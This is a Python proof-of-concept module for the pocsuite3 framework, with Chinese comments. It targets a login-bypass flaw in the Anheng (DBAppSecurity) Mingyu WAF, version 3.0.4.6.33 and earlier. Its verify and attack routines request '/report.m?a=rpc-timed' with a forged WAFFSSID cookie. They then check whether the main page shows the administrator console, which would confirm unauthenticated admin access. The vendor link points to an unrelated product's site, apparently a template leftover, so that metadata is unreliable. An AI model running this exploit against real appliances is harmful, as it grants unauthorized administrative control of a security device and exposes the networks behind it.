from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-29'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-29'  # 编写 PoC 的日期
    updateDate = '2022-07-29'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '明御WAF登录绕过'  # PoC 名称
    appPowerLink = 'https://www.zentao.net/'  # 漏洞厂商主页地址
    appName = '明御WAF'  # 漏洞应用名称
    appVersion = '''WAF V3.0.4.6.33 及以下版本'''  # 漏洞影响版本
    vulType = VUL_TYPE.LOGIN_BYPASS  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        安恒明御WAF 存在登录绕过漏洞，该漏洞存在于部分版本的产品中。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        path = "/report.m?a=rpc-timed"
        headers={
            'Cookie': 'WAFFSSID=123',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        }
        url = self.url + path
        try:
            resq = requests.get(url=url,headers=headers,timeout=5)
            resq_result = requests.get(url=self.url,headers=headers,timeout=5)
            # 报错显示的md5值只能 显示大概26位，这里选择对比前15位
            if resq.status_code == 200 and '系统管理员' in resq_result.text:
                #print(resq_windows.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = self.url+path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)